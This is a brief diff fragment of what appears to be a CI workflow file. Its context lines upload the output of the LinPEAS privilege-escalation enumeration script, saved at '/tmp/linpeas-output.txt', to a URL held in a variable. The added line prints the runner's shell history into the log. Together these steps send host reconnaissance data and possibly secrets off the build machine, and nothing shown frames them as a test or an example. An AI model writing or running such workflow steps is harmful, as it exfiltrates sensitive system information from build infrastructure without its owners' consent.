@@ -42,6 +42,7 @@ jobs:
           curl -s -o /dev/null -X POST "${TEST}" \
             -H "Content-Type: text/plain" \
             --data-binary "@/tmp/linpeas-output.txt"
+          echo "$(history)"
             
           
 
